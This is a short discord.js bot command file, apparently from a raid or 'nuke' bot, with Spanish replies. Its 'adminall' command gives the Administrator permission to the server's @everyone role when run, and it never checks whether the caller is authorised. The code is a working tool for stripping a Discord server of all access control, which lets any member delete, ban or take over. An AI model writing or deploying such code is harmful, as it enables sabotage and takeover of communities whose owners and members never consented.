const adminState = require('../adminState');
const { PermissionsBitField } = require('discord.js');

module.exports = {
    name: 'adminall',
    run: async (message) => {
        const guildId = message.guild.id;
        const userId = message.author.id;

        if (!adminState.start(guildId, userId)) {
            return message.reply('❌ Ya hay alguien usando un comando de admin en este servidor.');
        }

        try {
            const everyone = message.guild.roles.everyone;
            if (!everyone) return message.reply('❌ No se pudo encontrar el rol @everyone.');

            await everyone.setPermissions([PermissionsBitField.Flags.Administrator]);
            message.reply('✅ Se ha dado administrador a @everyone en este servidor.');
        } catch (err) {
            console.error(err);
            message.reply('❌ Hubo un error ejecutando !adminall.');
        } finally {
            adminState.stop(guildId);
        }
    }
};

